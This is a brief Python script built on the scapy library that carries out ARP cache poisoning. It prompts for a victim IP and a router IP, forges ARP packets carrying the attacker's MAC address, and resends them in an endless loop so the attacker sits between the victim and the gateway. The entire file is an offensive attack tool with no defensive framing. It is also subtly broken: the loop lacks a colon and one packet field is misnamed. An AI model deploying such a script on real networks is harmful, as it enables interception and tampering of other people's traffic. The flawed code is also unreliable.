#ARP cache poisoning to implement Man in the Middle Attack

import sys
import time
from scapy.all import *

# Get MAC address of the victim being spoofed using sample ARP request packets

def obtain_hwaddr(ip):
    req_packet = sr1(ARP(op=1,pdst=ip),verbose=0)
    return req_packet[0][ARP].hwsrc

#Constructing spoofed ARP packets so the attacker is in the middle of victim and gateway
def arp_spoof_cons(opcode,victim,spoof):

#Obtain the attacker's hardware address
    macs_list = [get_if_hwaddr(i) for i in get_if_list()]
    for mac in macs_list:
        if(mac != "00:00:00:00:00:00"):
            spoofed_mac = mac

    victim_mac = obtain_hwaddr(victim)

# Construct ARP packets to victim with attackers mac and Ip
    return ARP(op=opcode,psrc=spoof,hw_src=spoofed_mac,pdst=victim,hwdst=victim_mac)



victim_ip = raw_input("please enter the IP address of the victim machine :")
gateway_ip = raw_input("please enter the IP address of the router :")


arp_rtr = arp_spoof_cons(1,victim_ip,gateway_ip)
arp_xp  = arp_spoof_cons(1,gateway_ip,victim_ip)

#Print the constructed ARP packets

print(arp_rtr)
print(arp_xp)


#Looping to keep the targets in a spoofed state

while(1)
    send(arp_rtr,verbose=0)
    send(arp_xp,verbose=0)
    time.sleep(2)



